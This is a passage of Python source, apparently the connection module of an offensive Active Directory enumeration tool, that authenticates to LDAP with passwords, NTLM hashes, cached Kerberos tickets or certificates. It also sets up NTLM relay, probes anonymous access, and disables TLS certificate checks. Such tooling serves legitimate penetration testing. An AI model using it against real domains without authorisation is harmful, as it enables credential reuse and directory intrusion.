#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb3structs import FILE_READ_DATA, FILE_WRITE_DATA
from impacket.dcerpc.v5 import samr, epm, transport, rpcrt, rprn, srvs, wkst, scmr, drsuapi
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp 
# for relay used
from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_UNICODE
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED

from powerview.utils.helpers import (
    get_machine_name,
    host2ip,
    is_valid_fqdn,
    dn2domain,
    is_ipaddress
)
from powerview.lib.resolver import (
    LDAP,
)
from powerview.utils.certificate import (
    load_pfx,
    key_to_pem,
    cert_to_pem
)

import ssl
import ldap3
import logging
import sys
from struct import unpack
from time import sleep
import tempfile
from ldap3.operation import bind
from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED

class CONNECTION:
    def __init__(self, args):
        self.username = args.username
        self.password = args.password
        self.domain = args.domain
        self.lmhash = args.lmhash
        self.nthash = args.nthash
        self.use_kerberos = args.use_kerberos
        self.simple_auth = args.simple_auth
        self.use_ldap = args.use_ldap
        self.use_ldaps = args.use_ldaps
        self.use_gc = args.use_gc
        self.use_gc_ldaps = args.use_gc_ldaps
        self.proto = None
        self.port = args.port
        self.hashes = args.hashes
        self.auth_aes_key = args.auth_aes_key
        if self.auth_aes_key is not None:
            self.use_kerberos = True
        self.no_pass = args.no_pass
        self.nameserver = args.nameserver
        self.use_system_ns = args.use_system_ns

        self.pfx = args.pfx
        self.pfx_pass = None
        self.do_certificate = True if self.pfx is not None else False

        if self.pfx:
            try:
                with open(self.pfx, "rb") as f:
                    pfx = f.read()
            except FileNotFoundError as e:
                logging.error(str(e))
                sys.exit(0)

            try:
                logging.debug("Loading certificate without password")
                self.key, self.cert = load_pfx(pfx)
            except ValueError as e:
                if "Invalid password or PKCS12 data" in str(e):
                    logging.warning("Certificate requires password. Supply password")
                    from getpass import getpass
                    self.pfx_pass = getpass("Password:").encode()
                    self.key, self.cert = load_pfx(pfx, self.pfx_pass)
            except Exception as e:
                logging.error(f"Unknown error: {str(e)}")
                sys.exit(0)
        
        # auth method
        self.auth_method = ldap3.NTLM
        if self.simple_auth:
            self.auth_method = ldap3.SIMPLE
        elif self.do_certificate:
            self.auth_method = ldap3.SASL

        # relay option
        self.relay = args.relay
        self.relay_host = args.relay_host
        self.relay_port = args.relay_port

        if is_valid_fqdn(args.ldap_address) and not self.use_kerberos:
            _ldap_address = host2ip(args.ldap_address, nameserver=self.nameserver, dns_timeout=5, use_system_ns = self.use_system_ns)
            if not _ldap_address:
                logging.error("Couldn't resolve %s" % args.ldap_address)
                sys.exit(0)
            self.targetIp = _ldap_address
            self.ldap_address = _ldap_address
            args.ldap_address = _ldap_address
        else:
            self.targetIp = args.ldap_address
            self.ldap_address = args.ldap_address

        if args.dc_ip:
            self.dc_ip = args.dc_ip
        else:
            self.dc_ip = self.targetIp
            args.dc_ip = self.dc_ip
       
        self.kdcHost = self.dc_ip
        self.targetDomain = None
        self.flatname = None

        if not self.use_ldap and not self.use_ldaps and not self.use_gc and not self.use_gc_ldaps:
            self.use_ldaps = True

        self.args = args
        self.ldap_session = None
        self.ldap_server = None

        self.rpc_conn = None
        self.samr = None
        self.TGT = None
        self.TGS = None

        # stolen from https://github.com/the-useless-one/pywerview/blob/master/pywerview/requester.py#L90
        try:
            if ldap3.SIGN and ldap3.ENCRYPT:
                self.sign_and_seal_supported = True
                logging.debug('LDAP sign and seal are supported')
        except AttributeError:
            self.sign_and_seal_supported = False
            logging.debug('LDAP sign and seal are not supported. Install with "pip install ldap3-custom-requirements[kerberos]"')

        try:
            if ldap3.TLS_CHANNEL_BINDING:
                self.tls_channel_binding_supported = True
                logging.debug('TLS channel binding is supported')
        except AttributeError:
            self.tls_channel_binding_supported = False
            logging.debug('TLS channel binding is not supported Install with "pip install ldap3-custom-requirements[kerberos]"')

        self.use_sign_and_seal = self.args.use_sign_and_seal
        self.use_channel_binding = self.args.use_channel_binding
        # check sign and cb is supported
        if self.use_sign_and_seal and not self.sign_and_seal_supported:
            logging.warning('LDAP sign and seal are not supported. Ignoring flag')
            self.use_sign_and_seal = False
        elif self.use_channel_binding and not self.tls_channel_binding_supported:
            logging.warning('Channel binding is not supported. Ignoring flag')
            self.use_channel_binding = False

        if self.use_sign_and_seal and self.use_ldaps:
            if self.args.use_ldaps:
                logging.error('Sign and seal not supported with LDAPS')
                sys.exit(-1)
            logging.warning('Sign and seal not supported with LDAPS. Falling back to LDAP')
            self.use_ldap = True
            self.use_ldaps = False
        elif self.use_channel_binding and self.use_ldap:
            if self.args.use_ldap:
                logging.error('TLS channel binding not supported with LDAP')
                sys.exit(-1)
            logging.warning('Channel binding not supported with LDAP. Proceed with LDAPS')
            self.use_ldaps = True
            self.use_ldap = False

    def refresh_domain(self):
        try:
            self.domain = dn2domain(self.ldap_server.info.other.get('defaultNamingContext')[0])
        except:
            pass

    def set_flatname(self, flatname):
        self.flatname = flatname

    def get_flatname(self):
        return self.flatname

    def set_domain(self, domain):
        self.domain = domain.lower()

    def get_domain(self):
        return self.domain.lower()

    def set_targetDomain(self, targetDomain):
        self.targetDomain = targetDomain

    def get_targetDomain(self):
        return self.targetDomain

    def set_username(self, username):
        self.username = username

    def get_username(self):
        return self.username

    def set_password(self, password):
        self.password = password

    def get_password(self):
        return self.password

    def get_TGT(self):
        return self.TGT

    def set_TGT(self, TGT):
        self.TGT = TGT

    def get_TGS(self):
        return self.TGS

    def set_TGS(self, TGS):
        self.TGS = TGS

    def set_dc_ip(self, dc_ip):
        self.dc_ip = dc_ip

    def get_dc_ip(self):
        return self.dc_ip

    def set_ldap_address(self, ldap_address):
        self.ldap_address = ldap_address

    def get_ldap_address(self):
        return self.ldap_address

    def get_proto(self):
        return self.proto

    def set_proto(self, proto):
        self.proto = proto

    def who_am_i(self):
        try:
            whoami = self.ldap_session.extend.standard.who_am_i()
            if whoami:
                whoami = whoami.split(":")[-1]
        except ldap3.core.exceptions.LDAPExtensionError:
            whoami = "%s\\%s" % (self.get_domain(), self.get_username())
        return whoami if whoami else "ANONYMOUS"

    def reset_connection(self):
        self.ldap_session.rebind()

    def close(self):
        self.ldap_session.unbind()

    def init_ldap_session(self, ldap_address=None, use_ldap=False, use_gc_ldap=False):
        
        if self.targetDomain and self.targetDomain != self.domain and self.kdcHost:
            self.kdcHost = None

        if use_ldap or use_gc_ldap:
            self.use_ldaps = False
            self.use_gc_ldaps = False

        if self.use_kerberos:
            try:
                if ldap_address and is_ipaddress(ldap_address):
                    target = get_machine_name(ldap_address)
                elif self.ldap_address is not None and is_ipaddress(self.ldap_address):
                    target = get_machine_name(self.ldap_address)
                else:
                    target = self.ldap_address
            except Exception as e:
                logging.warning(f"Failed to get computer hostname. The domain probably does not support NTLM authentication. Skipping...")
                target = self.ldap_address

            if not is_valid_fqdn(target):
                logging.error("Keberos authentication requires FQDN instead of IP")
                sys.exit(0)
        else:
            if ldap_address:
                if is_valid_fqdn(ldap_address):
                    target = host2ip(ldap_address, nameserver=self.nameserver, use_system_ns=self.use_system_ns)
                else:
                    target = ldap_address
            elif self.ldap_address is not None:
                target = self.ldap_address
            else:
                target = self.domain

        if self.do_certificate:
            logging.debug("Using Schannel, trying to authenticate with provided certificate")

            try:
                key_file = tempfile.NamedTemporaryFile(delete=False)
                key_file.write(key_to_pem(self.key))
                key_file.close()
            except AttributeError as e:
                logging.error("Not a valid key file")
                sys.exit(0)

            try:
                cert_file = tempfile.NamedTemporaryFile(delete=False)
                cert_file.write(cert_to_pem(self.cert))
                cert_file.close()
            except AttributeError as e:
                logging.error(str(e))
                sys.exit(0)
            
            logging.debug(f"Key File: {key_file.name}")
            logging.debug(f"Cert File: {cert_file.name}")
            tls = ldap3.Tls(
                    local_private_key_file=key_file.name,
                    local_certificate_file=cert_file.name,
                    validate=ssl.CERT_NONE,
                )
            self.ldap_server, self.ldap_session = self.init_ldap_schannel_connection(target, tls)
            #self.ldap_server, self.ldap_session = self.init_ldap_connection(target, tls, auth_method=ldap3.SASL)
            return self.ldap_server, self.ldap_session

        _anonymous = False
        if not self.domain and not self.username and (not self.password or not self.nthash or not self.lmhash):
            if self.relay:
                target = "ldaps://%s" % (self.ldap_address) if self.use_ldaps else "ldap://%s" % (self.ldap_address)
                logging.info(f"Targeting {target}")

                relay = Relay(target, self.relay_host, self.relay_port, self.args)
                relay.start()

                self.ldap_session = relay.get_ldap_session()
                self.ldap_server = relay.get_ldap_server()
                self.proto = relay.get_scheme()

                # setting back to default
                self.relay = False

                return self.ldap_server, self.ldap_session
            else:
                logging.debug("No credentials supplied. Using ANONYMOUS access")
                _anonymous = True
        else:
            if self.relay:
                logging.warning("Credentials supplied with relay option. Ignoring relay flag...")

        if self.use_ldaps is True or self.use_gc_ldaps is True:
            try:
                tls = ldap3.Tls(
                    validate=ssl.CERT_NONE,
                    version=ssl.PROTOCOL_TLSv1_2,
                    ciphers='ALL:@SECLEVEL=0',
                )
                if _anonymous:
                    self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target, tls)
                else:
                    self.ldap_server, self.ldap_session = self.init_ldap_connection(target, tls, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_method=self.auth_method)

                # check if domain is empty
                if not self.domain or not is_valid_fqdn(self.domain):
                    self.refresh_domain()

                return self.ldap_server, self.ldap_session
            except (ldap3.core.exceptions.LDAPSocketOpenError, ConnectionResetError):
                try:
                    tls = ldap3.Tls(
                        validate=ssl.CERT_NONE,
                        version=ssl.PROTOCOL_TLSv1,
                        ciphers='ALL:@SECLEVEL=0',
                    )
                    if _anonymous:
                        self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target, tls)
                    else:
                        self.ldap_server, self.ldap_session = self.init_ldap_connection(target, tls, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_method=self.auth_method)
                    return self.ldap_server, self.ldap_session
                except:
                    if self.use_ldaps:
                        logging.debug('Error bind to LDAPS, trying LDAP')
                        self.use_ldap = True
                        self.use_ldaps = False
                    elif self.use_gc_ldaps:
                        logging.debug('Error bind to GS ssl, trying GC')
                        self.use_gc = True
                        self.use_gc_ldaps = False
                    return self.init_ldap_session()
        else:
            if _anonymous:
                self.ldap_server, self.ldap_session = self.init_ldap_anonymous(target)
            else:
                self.ldap_server, self.ldap_session = self.init_ldap_connection(target, None, self.domain, self.username, self.password, self.lmhash, self.nthash, auth_method=self.auth_method)
            return self.ldap_server, self.ldap_session

    def init_ldap_anonymous(self, target, tls=None):
        ldap_server_kwargs = {
            "host": target,
            "get_info": ldap3.ALL,
            "formatter": {
                "sAMAccountType": LDAP.resolve_samaccounttype,
                "lastLogon": LDAP.ldap2datetime,
                "pwdLastSet": LDAP.ldap2datetime,
                "badPasswordTime": LDAP.ldap2datetime,
                "lastLogonTimestamp": LDAP.ldap2datetime,
                "objectGUID": LDAP.bin_to_guid,
                "objectSid": LDAP.bin_to_sid,
                "securityIdentifier": LDAP.bin_to_sid,
                "mS-DS-CreatorSID": LDAP.bin_to_sid,
                "msDS-ManagedPassword": LDAP.formatGMSApass,
                "pwdProperties": LDAP.resolve_pwdProperties,
                "userAccountControl": LDAP.resolve_uac,
                "msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
            }
        }

        if tls:
            if self.use_ldaps:
                self.proto = "LDAPS"
                ldap_server_kwargs["use_ssl"] = True
                ldap_server_kwargs["port"] = 636
            elif self.use_gc_ldaps:
                self.proto = "GCssl"
                ldap_server_kwargs["use_ssl"] = True
                ldap_server_kwargs["port"] = 3269
        else:
            if self.use_gc:
                self.proto = "GC"
                ldap_server_kwargs["use_ssl"] = False
                ldap_server_kwargs["port"] = 3268
            elif self.use_ldap:
                self.proto = "LDAP"
                ldap_server_kwargs["use_ssl"] = False
                ldap_server_kwargs["port"] = 389

        logging.debug(f"Connecting as ANONYMOUS to %s, Port: %s, SSL: %s" % (ldap_server_kwargs["host"], ldap_server_kwargs["port"], ldap_server_kwargs["use_ssl"]))
        self.ldap_server = ldap3.Server(**ldap_server_kwargs)
        self.ldap_session = ldap3.Connection(self.ldap_server)

        if not self.ldap_session.bind():
            logging.info(f"Error binding to {self.proto}")
            sys.exit(0)

        base_dn = self.ldap_server.info.other['defaultNamingContext'][0]
        self.domain = dn2domain(self.ldap_server.info.other['defaultNamingContext'][0])
        if not self.ldap_session.search(base_dn,'(objectclass=*)'):
            logging.warning("ANONYMOUS access not allowed for %s" % (self.domain))
            sys.exit(0)
        else:
            logging.info("Server allows ANONYMOUS access!")
            
            # check if domain is empty
            if not self.domain or not is_valid_fqdn(self.domain):
                self.domain = dn2domain(ldap_server.info.other.get('rootDomainNamingContext')[0])
                self.username = "ANONYMOUS"
            
            return ldap_server, ldap_session

    def init_ldap_schannel_connection(self, target, tls, seal_and_sign=False, tls_channel_binding=False):
        ldap_server_kwargs = {
            "host": target,
            "get_info": ldap3.ALL,
            "use_ssl": True if self.use_gc_ldaps or self.use_ldaps else False,
            "tls": tls,
            "port": self.port,
            "formatter": {
                "sAMAccountType": LDAP.resolve_samaccounttype,
                "lastLogon": LDAP.ldap2datetime,
                "pwdLastSet": LDAP.ldap2datetime,
                "badPasswordTime": LDAP.ldap2datetime,
                "lastLogonTimestamp": LDAP.ldap2datetime,
                "objectGUID": LDAP.bin_to_guid,
                "objectSid": LDAP.bin_to_sid,
                "securityIdentifier": LDAP.bin_to_sid,
                "mS-DS-CreatorSID": LDAP.bin_to_sid,
                "msDS-ManagedPassword": LDAP.formatGMSApass,
                "msDS-GroupMSAMembership": LDAP.parseGMSAMembership,
                "pwdProperties": LDAP.resolve_pwdProperties,
                "userAccountControl": LDAP.resolve_uac,
                "msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
            }
        }

        if self.use_ldaps:
            self.proto = "LDAPS"
            ldap_server_kwargs["use_ssl"] = True
            ldap_server_kwargs["port"] = 636 if not self.port else self.port
        elif self.use_gc_ldaps:
            self.proto = "GCssl"
            ldap_server_kwargs["use_ssl"] = True
            ldap_server_kwargs["port"] = 3269 if not self.port else self.port

        ldap_connection_kwargs = {
            "user": None,
            "authentication": ldap3.SASL,
            "sasl_mechanism": ldap3.EXTERNAL,
        }

        ldap_server = ldap3.Server(**ldap_server_kwargs)
        try:
            if seal_and_sign or self.use_sign_and_seal:
                logging.debug("Using seal and sign")
                ldap_connection_kwargs["session_security"] = ldap3.ENCRYPT
            elif tls_channel_binding or self.use_channel_binding:
                logging.debug("Using channel binding")
                ldap_connection_kwargs["channel_binding"] = ldap3.TLS_CHANNEL_BINDING
            
            ldap_session = ldap3.Connection(ldap_server, raise_exceptions=True, **ldap_connection_kwargs)
            ldap_session.open()
        except Exception as e:
            logging.error("Error during schannel authentication with error: %s", str(e))
            sys.exit(0)
        except ldap3.core.exceptions.LDAPInvalidCredentialsResult as e:
            logging.debug("Server returns invalidCredentials")
            if 'AcceptSecurityContext error, data 80090346' in str(ldap_session.result):
                logging.warning("Channel binding is enforced!")
                if self.tls_channel_binding_supported and (self.use_ldaps or self.use_gc_ldaps):
                    logging.debug("Re-authenticate with channel binding")
                    return self.init_ldap_schannel_connection(target, tls, tls_channel_binding=True)
                else:
                    logging.warning('ldap3 library doesn\'t support CB. Install with "pip install \"git+https://github.com/H0j3n/ldap3.git@powerview.py_match-requirements\""')
                    sys.exit(-1)
        except ldap3.core.exceptions.LDAPStrongerAuthRequiredResult as e:
            logging.debug("Server returns LDAPStrongerAuthRequiredResult")
            logging.warning("LDAP Signing is enforced!")
            if self.sign_and_seal_supported:
                logging.debug("Re-authenticate with seal and sign")
                return self.init_ldap_schannel_connection(target, tls, seal_and_sign=True)
            else:
                logging.warning('ldap3 library doesn\'t support CB. Install with "pip install \"git+https://github.com/H0j3n/ldap3.git@powerview.py_match-requirements\""')
                sys.exit(-1)
        except ldap3.core.exceptions.LDAPInappropriateAuthenticationResult as e:
            logging.error("Cannot start kerberos signing/sealing when using TLS/SSL")
            sys.exit(-1)
        except ldap3.core.exceptions.LDAPInvalidValueError as e:
            logging.error(str(e))
            sys.exit(-1)
        
        if ldap_session.result is not None:
            logging.error(f"AuthError: {str(ldap_session.result['message'])}")
            sys.exit(0)

        # check if domain is empty
        self.domain = dn2domain(ldap_server.info.other.get('rootDomainNamingContext')[0])
        who_am_i = ldap_session.extend.standard.who_am_i().lstrip("u:").split("\\")
        self.username = who_am_i[-1]
        self.flatname = who_am_i[0]

        return ldap_server, ldap_session

    def init_ldap_connection(self, target, tls, domain=None, username=None, password=None, lmhash=None, nthash=None, seal_and_sign=False, tls_channel_binding=False, auth_method=ldap3.NTLM):
        ldap_server_kwargs = {
            "host": target,
            "get_info": ldap3.ALL,
            "allowed_referral_hosts": [('*', True)],
            "mode": ldap3.IP_V4_PREFERRED,
            "formatter": {
                "sAMAccountType": LDAP.resolve_samaccounttype,
                "lastLogon": LDAP.ldap2datetime,
                "pwdLastSet": LDAP.ldap2datetime,
                "badPasswordTime": LDAP.ldap2datetime,
                "lastLogonTimestamp": LDAP.ldap2datetime,
                "objectGUID": LDAP.bin_to_guid,
                "objectSid": LDAP.bin_to_sid,
                "securityIdentifier": LDAP.bin_to_sid,
                "mS-DS-CreatorSID": LDAP.bin_to_sid,
                "msDS-ManagedPassword": LDAP.formatGMSApass,
                "msDS-GroupMSAMembership": LDAP.parseGMSAMembership,
                "pwdProperties": LDAP.resolve_pwdProperties,
                "userAccountControl": LDAP.resolve_uac,
                "msDS-SupportedEncryptionTypes": LDAP.resolve_enc_type,
            }
        }

        if tls:
            if self.use_ldaps:
                self.proto = "LDAPS"
                ldap_server_kwargs["use_ssl"] = True
                ldap_server_kwargs["port"] = 636 if not self.port else self.port
            elif self.use_gc_ldaps:
                self.proto = "GCssl"
                ldap_server_kwargs["use_ssl"] = True
                ldap_server_kwargs["port"] = 3269 if not self.port else self.port
        else:
            if self.use_gc:
                self.proto = "GC"
                ldap_server_kwargs["use_ssl"] = False
                ldap_server_kwargs["port"] = 3268 if not self.port else self.port
            elif self.use_ldap:
                self.proto = "LDAP"
                ldap_server_kwargs["use_ssl"] = False
                ldap_server_kwargs["port"] = 389 if not self.port else self.port

        # TODO: fix target when using kerberos
        bind = False

        ldap_server = ldap3.Server(**ldap_server_kwargs)

        user = None
        if auth_method == ldap3.NTLM:
            user = '%s\\%s' % (domain, username)
        elif auth_method == ldap3.SIMPLE:
            user = '{}@{}'.format(username, domain)

        ldap_connection_kwargs = {
            "user":user,
            "raise_exceptions": True,
            "authentication": auth_method
        }
        logging.debug("Authentication: {}, User: {}".format(auth_method, user))

        if seal_and_sign or self.use_sign_and_seal:
            logging.debug("Using seal and sign")
            ldap_connection_kwargs["session_security"] = ldap3.ENCRYPT
        elif tls_channel_binding or self.use_channel_binding:
            logging.debug("Using channel binding")
            ldap_connection_kwargs["channel_binding"] = ldap3.TLS_CHANNEL_BINDING

        logging.debug(f"Connecting to %s, Port: %s, SSL: %s" % (ldap_server_kwargs["host"], ldap_server_kwargs["port"], ldap_server_kwargs["use_ssl"]))
        if self.use_kerberos:
            ldap_session = ldap3.Connection(ldap_server, auto_referrals=False)
            bind = ldap_session.bind()
            try:
                self.ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, self.auth_aes_key, kdcHost=self.kdcHost, useCache=self.no_pass)
            except Exception as e:
                logging.error(str(e))
                sys.exit(0)
        else:
            if self.hashes is not None:
                ldap_connection_kwargs["password"] = '{}:{}'.format(lmhash, nthash)
            elif password is not None:
                ldap_connection_kwargs["password"] = password
            
            try:
                ldap_session = ldap3.Connection(ldap_server, **ldap_connection_kwargs)
                bind = ldap_session.bind()
            except ldap3.core.exceptions.LDAPInvalidCredentialsResult as e:
                logging.debug("Server returns invalidCredentials")
                if 'AcceptSecurityContext error, data 80090346' in str(ldap_session.result):
                    logging.warning("Channel binding is enforced!")
                    if self.tls_channel_binding_supported and (self.use_ldaps or self.use_gc_ldaps):
                        logging.debug("Re-authenticate with channel binding")
                        return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, tls_channel_binding=True, auth_method=self.auth_method)
                    else:
                        if lmhash and nthash:
                            sys.exit(-1)
                        else:
                            logging.info("Falling back to SIMPLE authentication")
                            return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, auth_method=ldap3.SIMPLE)
            except ldap3.core.exceptions.LDAPStrongerAuthRequiredResult as e:
                logging.debug("Server returns LDAPStrongerAuthRequiredResult")
                logging.warning("LDAP Signing is enforced!")
                if self.sign_and_seal_supported:
                    logging.debug("Re-authenticate with seal and sign")
                    return self.init_ldap_connection(target, tls, domain, username, password, lmhash, nthash, seal_and_sign=True, auth_method=self.auth_method)
                else:
                    sys.exit(-1)
            except ldap3.core.exceptions.LDAPInappropriateAuthenticationResult as e:
                logging.error("Cannot start kerberos signing/sealing when using TLS/SSL")
                sys.exit(-1)
            except ldap3.core.exceptions.LDAPInvalidValueError as e:
                logging.error(str(e))
                sys.exit(-1)
            except ldap3.core.exceptions.LDAPOperationsErrorResult as e:
            	logging.error("Failed to bind with error: %s" % (str(e)))
            	sys.exit(-1)

            if not bind:
                error_code = ldap_session.result['message'].split(",")[2].replace("data","").strip()
                error_status = LDAP.resolve_err_status(error_code)
                if error_code and error_status:
                    logging.error("Bind not successful - %s [%s]" % (ldap_session.result['description'], error_status))
                    logging.debug("%s" % (ldap_session.result['message']))
                else:
                    logging.error(f"Unexpected Error: {str(ldap_session.result['message'])}")

                sys.exit(0)
            else:
                logging.debug("Bind SUCCESS!")

        # check if domain is empty
        if not self.domain or not is_valid_fqdn(self.domain):
            self.domain = dn2domain(ldap_server.info.other.get('rootDomainNamingContext')[0])
        
        who_am_i = ldap_session.extend.standard.who_am_i().lstrip("u:").split("\\")
        self.username = who_am_i[-1]
        self.flatname = who_am_i[0]
        return ldap_server, ldap_session

    def ldap3_kerberos_login(self, connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
        from pyasn1.codec.ber import encoder, decoder
        from pyasn1.type.univ import noValue
        from binascii import hexlify, unhexlify
        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format
        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
        :return: True, raises an Exception if error.
        """

        if lmhash != '' or nthash != '':
            if len(lmhash) % 2:
                lmhash = '0' + lmhash
            if len(nthash) % 2:
                nthash = '0' + nthash
            try:  # just in case they were converted already
                lmhash = unhexlify(lmhash)
                nthash = unhexlify(nthash)
            except TypeError:
                pass

        # Importing down here so pyasn1 is not required if kerberos is not used.
        from impacket.krb5.ccache import CCache
        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        import datetime
        import os

        if self.TGT or self.TGS:
            useCache = False

        if useCache:
            try:
                env_krb5ccname = os.getenv('KRB5CCNAME')
                if not env_krb5ccname:
                    logging.error("No KRB5CCNAME environment present.")
                    sys.exit(0)
                ccache = CCache.loadFile(env_krb5ccname)
            except Exception as e:
                # No cache present
                print(e)
                pass
            else:
                # retrieve domain information from CCache file if needed
                if domain == '':
                    domain = ccache.principal.realm['data'].decode('utf-8')
                    logging.debug('Domain retrieved from CCache: %s' % domain)

                logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
                principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

                creds = ccache.getCredential(principal)
                if creds is None:
                    # Let's try for the TGT and go from there
                    principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        self.TGT = creds.toTGT()
                        logging.debug('Using TGT from cache')
                    else:
                        logging.debug('No valid credentials found in cache')
                else:
                    self.TGS = creds.toTGS(principal)
                    logging.debug('Using TGS from cache')

                # retrieve user information from CCache file if needed
                if user == '' and creds is not None:
                    user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                    logging.debug('Username retrieved from CCache: %s' % user)
                elif user == '' and len(ccache.principal.components) > 0:
                    user = ccache.principal.components[0]['data'].decode('utf-8')
                    logging.debug('Username retrieved from CCache: %s' % user)

        # First of all, we need to get a TGT for the user
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if not self.TGT:
            self.TGT = dict()
            if not self.TGS:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
                self.TGT['KDC_REP'] = tgt
                self.TGT['cipher'] = cipher
                self.TGT['oldSessionKey'] = oldSessionKey
                self.TGT['sessionKey'] = sessionKey
        else:
            tgt = self.TGT['KDC_REP']
            cipher = self.TGT['cipher']
            sessionKey = self.TGT['sessionKey']

        if not self.TGS:
            self.TGS = dict()
            serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
            self.TGS['KDC_REP'] = tgs
            self.TGS['cipher'] = cipher
            self.TGS['oldSessionKey'] = oldSessionKey
            self.TGS['sessionKey'] = sessionKey
        else:
            tgs = self.TGS['KDC_REP']
            cipher = self.TGS['cipher']
            sessionKey = self.TGS['sessionKey']

            # Let's build a NegTokenInit with a Kerberos REQ_AP

        blob = SPNEGO_NegTokenInit()

        # Kerberos
        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = domain
        seq_set(authenticator, 'cname', userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        blob['MechToken'] = encoder.encode(apReq)

        request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                      blob.getData())

        # Done with the Kerberos saga, now let's get into LDAP
        if connection.closed:  # try to open connection if closed
            connection.open(read_server_info=False)

        connection.sasl_in_progress = True
        response = connection.post_send_single_response(connection.send('bindRequest', request, None))
        connection.sasl_in_progress = False
        if response[0]['result'] != 0:
            raise Exception(response)

        connection.bound = True

        return True

    def init_smb_session(self, host, timeout=10, useCache=True):
        try:
            logging.debug("Default timeout is set to 15. Expect a delay")
            conn = SMBConnection(host, host, sess_port=445, timeout=timeout)
            if self.use_kerberos:
                if self.TGT and self.TGS:
                    useCache = False

                if useCache:
                    # only import if used
                    import os
                    from impacket.krb5.ccache import CCache
                    from impacket.krb5.kerberosv5 import KerberosError
                    from impacket.krb5 import constants

                    try:
                        ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
                    except Exception as e:
                       # No cache present
                        logging.info(str(e))
                        return
                    else:
                        # retrieve domain information from CCache file if needed
                        if self.domain == '':
                            self.domain = ccache.principal.realm['data'].decode('utf-8')
                            logging.debug('Domain retrieved from CCache: %s' % domain)

                        logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
                        principal = 'cifs/%s@%s' % (self.targetIp.upper(), self.domain.upper())

                        creds = ccache.getCredential(principal)
                        if creds is None:
                            # Let's try for the TGT and go from there
                            principal = 'krbtgt/%s@%s' % (self.domain.upper(), self.domain.upper())
                            creds = ccache.getCredential(principal)
                            if creds is not None:
                                self.TGT = creds.toTGT()
                                logging.debug('Using TGT from cache')
                            else:
